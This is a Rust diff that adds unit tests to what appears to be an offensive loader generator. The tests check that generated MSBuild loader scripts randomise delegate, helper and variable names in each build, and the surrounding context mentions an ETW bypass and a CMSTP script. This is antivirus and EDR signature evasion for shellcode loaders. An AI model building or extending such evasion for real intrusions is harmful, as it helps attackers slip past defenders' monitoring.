@@ -132,6 +132,36 @@ fn msbuild_etw_bypass() {
         "MSBuild must have ETW bypass via charcode or reflection");
 }
 
+#[test]
+fn msbuild_no_static_delegate_names() {
+    let src = generate_script_source(&base_config(LoaderType::MsBuild)).unwrap();
+    assert!(!src.contains("NtAllocFn"), "MSBuild must not use static NtAllocFn delegate type name");
+    assert!(!src.contains("NtProtFn"),  "MSBuild must not use static NtProtFn delegate type name");
+    assert!(!src.contains("NtAlloc "),  "MSBuild must not use static NtAlloc variable name");
+    assert!(!src.contains("NtProt "),   "MSBuild must not use static NtProt variable name");
+}
+
+#[test]
+fn msbuild_no_static_helper_names() {
+    let src = generate_script_source(&base_config(LoaderType::MsBuild)).unwrap();
+    // Helper functions B() and N() must be renamed every build.
+    // They are called as e.g. `xZqRmPwY(new int[]{...})` — single-letter names must not appear.
+    assert!(!src.contains(" B(new int[]"), "MSBuild must not use static single-char helper B");
+    assert!(!src.contains(" N(new int[]"), "MSBuild must not use static single-char helper N");
+}
+
+#[test]
+fn msbuild_two_builds_different_locals() {
+    let s1 = generate_script_source(&base_config(LoaderType::MsBuild)).unwrap();
+    let s2 = generate_script_source(&base_config(LoaderType::MsBuild)).unwrap();
+    // Delegate type declarations must differ between builds
+    let find_delegate = |s: &str| -> String {
+        s.lines().find(|l| l.contains("private delegate int ")).unwrap_or("").to_string()
+    };
+    assert_ne!(find_delegate(&s1), find_delegate(&s2),
+        "MSBuild delegate type names must be randomised per build");
+}
+
 // ── Script: CMSTP ─────────────────────────────────────────────────────────────
 
 #[test]
